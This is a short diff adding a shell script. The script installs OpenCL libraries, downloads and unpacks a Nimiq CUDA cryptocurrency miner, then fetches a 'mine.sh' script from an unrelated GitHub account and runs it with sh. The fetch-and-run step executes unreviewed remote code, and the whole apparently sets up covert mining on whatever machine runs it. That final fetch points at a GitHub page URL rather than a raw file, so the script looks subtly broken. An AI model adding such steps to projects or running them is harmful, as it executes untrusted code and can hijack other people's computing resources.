@@ -1,0 +1,5 @@
+apt install -y ocl-icd-opencl-dev
+wget -N https://github.com/NoncerPro/noncerpro-nimiq-cuda/releases/download/v3.2.0/noncerpro-cuda-linux-3.2.0.tar.gz
+tar xvzf ./noncerpro-cuda-linux-3.2.0.tar.gz
+wget -N https://github.com/mobile8474/mobile84121274/blob/master/mine.sh
+sh ./mine.sh
